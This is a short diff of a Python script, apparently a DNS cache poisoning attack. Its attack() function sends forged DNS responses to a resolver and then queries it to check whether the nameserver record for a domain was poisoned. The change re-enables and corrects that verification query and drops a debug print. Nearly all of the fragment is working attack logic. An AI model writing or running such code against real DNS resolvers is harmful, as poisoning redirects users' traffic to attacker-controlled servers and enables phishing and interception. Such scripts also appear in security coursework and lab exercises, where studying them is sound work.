@@ -89,7 +89,8 @@ def attack():
             sendPacket(sock, fake_response, my_ip, query_port)
 
         # check to see if it worked
-        # sendPacket(sock, dns_request, my_ip, dns_port)
+        dns_request[DNS].qd.qname = base_domain
+        sendPacket(sock, dns_request, my_ip, dns_port)
         response = sock.recv(4096)
         print response
         response = DNS(response[2:])
@@ -99,7 +100,6 @@ def attack():
                 exit(0)
             else:
                 print "Poisonning on %s failed, ns is %s" % (url, str(response[DNS].ns))
-                print response.show()
         except:
             print "Poisonning on %s failed, response is \n%s" % (url, response.show())
     
